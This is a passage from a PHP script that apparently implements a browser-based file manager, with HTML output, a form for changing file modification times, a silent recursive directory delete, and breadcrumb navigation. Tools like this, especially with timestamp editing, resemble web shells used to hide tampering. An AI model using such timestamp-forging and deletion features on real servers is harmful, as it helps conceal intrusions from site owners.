        <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
        <input type="datetime-local" name="new_mtime" value="'.htmlspecialchars($mtime? date('Y-m-d\TH:i:s', $mtime) : '').'" step="1">
        <button class="btn gray small" type="submit">Set Date</button>
      </form>';

    echo '</td></tr>';
}

echo '</tbody></table>';

echo '</div></body></html>';

function fm_delete_dir(string $dir): bool {
    if (!is_dir($dir)) return false;
    foreach (array_diff(scandir($dir), ['.','..']) as $f) {
        $p = "$dir/$f";
        if (is_dir($p)) fm_delete_dir($p); else @unlink($p);
    }
    return @rmdir($dir);
}

function fm_breadcrumb(string $relPath): string {
    $parts = array_filter(explode('/', $relPath));
    $acc = '';
    $html = '<div class="breadcrumb"><a href="?path=">ROOTT</a>';
    foreach ($parts as $p) {
        $acc .= ($acc ? '/' : '') . $p;
        $html .= ' / <a href="?path=' . urlencode($acc) . '"><b>' . htmlspecialchars($p) . '</b></a>';
    }
    $html .= '</div>';
    return $html;
}
